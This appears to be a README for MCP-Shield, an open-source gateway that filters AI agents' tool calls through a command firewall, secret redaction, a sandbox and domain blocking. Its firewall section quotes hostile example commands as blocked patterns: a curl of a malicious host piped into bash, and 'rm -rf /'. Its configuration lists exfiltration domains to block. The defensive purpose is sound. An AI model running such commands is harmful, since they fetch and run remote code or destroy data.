# MCP-Shield: The Zero-Trust Security Gateway for Model Context Protocol (MCP)

[![CI](https://github.com/rahulxcodex/mcp-shield/actions/workflows/ci.yml/badge.svg)](https://github.com/rahulxcodex/mcp-shield/actions/workflows/ci.yml)

**MCP-Shield** is an open-source, ultra-low-latency **Zero-Trust Security Gateway** designed explicitly for the [Model Context Protocol (MCP)](https://modelcontextprotocol.io/). It acts as a transparent, high-performance wire proxy that secures your local developer environment against malicious AI agents, prompt injections, and data exfiltration.

With the rapid adoption of AI IDEs and agents like **Claude Desktop**, **Cursor**, **Windsurf**, and **Cline**, granting AI unrestricted host privileges is a massive security risk. MCP-Shield intercepts the JSON-RPC streams in real-time, enforcing strict **AST firewalls**, **Data Loss Prevention (DLP)**, and **Rate Limiting** before commands ever reach your OS.

---

## 🚀 Key Security Features for LLM Agents

### 1. Advanced AST Command Firewall (Shell Evasion Prevention)
Stop arbitrary code execution and destructive commands dead in their tracks. By leveraging a `tree-sitter-bash` Concrete Syntax Tree (AST), MCP-Shield actively blocks:
- **Subshell executions** and process substitutions (`$(...)`, `<(...)`)
- **Direct pipes to interpreters** (`curl http://malicious.com | /bin/bash`)
- **Destructive filesystem wipes** (e.g., `rm -rf /` or `--recursive /etc`)

### 2. Bijective Secret Sanitizer (Data Loss Prevention / DLP)
Never leak an API key to an LLM again. Our **Zero-Allocation DLP Engine** uses a single-pass compound lexer to detect and redact sensitive credentials (AWS Keys, GitHub PATs, OpenAI Keys, SSH Private Keys) before they reach the model.
- **Shannon Entropy Analysis:** Automatically detects and masks high-entropy unstructured secrets (like base64 passwords).
- **Honey-Token Quarantine:** Injects decoy credentials and instantly terminates the session if an AI agent attempts to use them.

### 3. Copy-on-Write (COW) Virtual Filesystem Sandbox
Safely intercept AI file modifications. When an agent attempts a `write_file` tool call, MCP-Shield stages the changes in a `.mcp-shield/cow` sandbox and generates a colored diff for your review.

### 4. Runaway LLM Loop Prevention (Rate Limiting)
Autonomous agents can easily get stuck in infinite death loops, burning through expensive API tokens. Our built-in rate limiter halts execution if an agent repeatedly calls the same tool within a short window.

### 5. Egress Network Firewall
Block LLM data exfiltration attempts. MCP-Shield intercepts arguments containing URLs and validates them against a customizable domain blocklist (e.g., blocking `*.ngrok.io` or `*.evil.com`).

### 6. Tamper-Evident Audit Logging & Replay Engine
For enterprise compliance, every intercepted tool call, policy decision, and TUI approval is logged in a JSONL file with **cryptographic SHA-256 hash-chaining**. Use the CLI to playback and visualize historical sessions securely.

---

## 🛠️ Quick Start & Installation

### Auto-Discover & Protect Your IDEs
MCP-Shield can automatically patch your existing MCP configurations to wrap your active servers in our zero-trust proxy. Supported clients include **Claude Desktop**, **Cursor IDE**, **Cline**, and **Windsurf**.

```bash
# Install and run the auto-discovery protector
npx mcp-shield protect
```

### Manual Wrapping
You can secure any downstream MCP server manually by prefixing your start command:

```bash
npx mcp-shield wrap -- npx -y @modelcontextprotocol/server-filesystem /Users/dev/workspace
```

---

## ⚙️ Configuration & Policy Engine

MCP-Shield is governed by a declarative, hot-reloadable YAML policy engine (`shield.config.default.yaml`). You can customize redaction thresholds, egress domains, and target-specific rule sets.

```yaml
version: "1.0"
profile: "developer"

sandbox:
  cowEnabled: true
  cowStagingDir: ".mcp-shield/cow"
  autoCommitOnApproval: true

egress:
  enabled: true
  blockedDomains:
    - "*.ngrok.io"
    - "*.evil.com"

redaction:
  enabled: true
  highEntropyCheck: true
  entropyThreshold: 4.2

rules:
  - id: "block-destructive-rm"
    name: "Block Recursive Root Deletion"
    targetTools: ["*bash*", "*terminal*", "*exec*"]
    riskLevel: "CRITICAL"
    action: "block"
```

---

## 📈 Real-Time Web Dashboard

Gain instant visibility into your AI security posture. MCP-Shield includes an embedded Express/React web dashboard powered by WebSockets.
Monitor intercepted attacks, rate limits, and sanitized secrets in real-time at `http://localhost:3333`.

---

## 🛡️ Enterprise AI Cybersecurity Mitigations

MCP-Shield directly mitigates top OWASP vulnerabilities for LLM applications:
- **TV-02: Indirect Prompt Injection (IPI)**
- **TV-04: Arbitrary Shell Evasion & Command Injection**
- **TV-05: Credential Harvesting & Unauthorized Data Exfiltration**

---
*Tags: Model Context Protocol, MCP, AI Security, LLM Agents, Claude Desktop, Cursor IDE, Windsurf, Cline, Prompt Injection, Zero-Trust Architecture, Cybersecurity, DevSecOps, Rate Limiting, AST Firewall, DLP, Data Loss Prevention.*
